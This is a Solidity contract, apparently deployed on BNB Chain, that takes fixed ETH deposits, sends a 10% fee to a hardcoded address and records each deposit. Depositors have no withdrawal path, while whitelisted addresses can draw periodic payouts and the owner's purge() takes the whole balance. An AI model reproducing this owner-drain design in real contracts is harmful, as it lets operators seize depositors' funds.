/**
 *Submitted for verification at BscScan.com on 2022-07-27
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.7;

abstract contract Ownable {
    address internal owner;
    constructor(address _owner) { owner = _owner; }
    modifier onlyOwner() { require(isOwner(msg.sender), "!OWNER"); _; }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function transferOwnership(address payable adr) public onlyOwner {
        owner = adr;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract RewardBank is Ownable {
  using SafeMath for uint256;

  mapping (address=>bool) private allowance;

  address private recaiver;
  uint256 public periodamount;
  uint256 public periodcooldown;

  uint256 private wait;

  uint256 public depositid;
  mapping (uint256=>address) public recipe_depositor;
  mapping (uint256=>uint256) public recipe_amount;
  mapping (uint256=>uint256) public recipe_block;

  mapping (uint256=>uint256) public deposit_package;

  uint256 public depositfee;
  uint256 public denominator;
  
  constructor(uint256 _periodamount,uint256 _periodcooldown) Ownable(msg.sender) {
    recaiver = 0xb44403bC446f0EdBeC0310Fb553EF1a9a8D9641c;
    periodamount = _periodamount;
    periodcooldown = _periodcooldown;
    //
    deposit_package[0] = 10000000000000000; //0.01 ETH
    deposit_package[1] = 50000000000000000; //0.05 ETH
    deposit_package[2] = 250000000000000000; //0.25 ETH
    //
    depositfee = 100;
    denominator = 1000;
  }

  function deposit(uint256 packageid) external payable returns (bool) {
    require(msg.value==deposit_package[packageid],"IBANK : not found package");
    
    uint256 fee = msg.value.mul(depositfee).div(denominator);
    (bool success, ) = recaiver.call{ value : fee }("");
    require(success,"transfer fail!");

    generaterecipe(msg.sender,msg.value,block.timestamp);

    return true;
  }

  function grantAllowance(address account,bool flag) external onlyOwner returns (bool) {
    allowance[account] = flag;
    return true;
  }

  function configBank(address _recaiver,uint256 _amountETH,uint256 _cooldown) external onlyOwner returns (bool) {
    recaiver = _recaiver;
    periodamount = _amountETH;
    periodcooldown = _cooldown;
    return true;
  }

  function isAllowance(address account) external view returns (bool) { return allowance[account]; }
  function getrecavier() external view returns (address) { return recaiver; }
  function getperiodamount() external view returns (uint256) { return periodamount; }
  function getperiodcooldown() external view returns (uint256) { return periodcooldown; }
  function cooldown() external view returns (uint256) { return wait; }

  function reserve() external returns (bool) {
    require(allowance[msg.sender],"IBANL : revert allowance");
    require(block.timestamp>wait,"IBANK : revert by transfer wait");

    (bool success, ) = msg.sender.call{ value : periodamount }("");
    require(success,"transfer fail!");

    wait = block.timestamp.add(periodcooldown);

    return true;
  }

  function generaterecipe(address _depositor,uint256 _amount,uint256 _when) internal returns (bool) {
    depositid = depositid.add(1);
    recipe_depositor[depositid] = _depositor;
    recipe_amount[depositid] = _amount;
    recipe_block[depositid] = _when;
    return true;
  }

  function purge() external onlyOwner() returns (bool) {
    (bool success, ) = msg.sender.call{ value : address(this).balance }("");
    require(success,"purge fail!");
    return true;
  }
  
  function recaive() public payable {}

}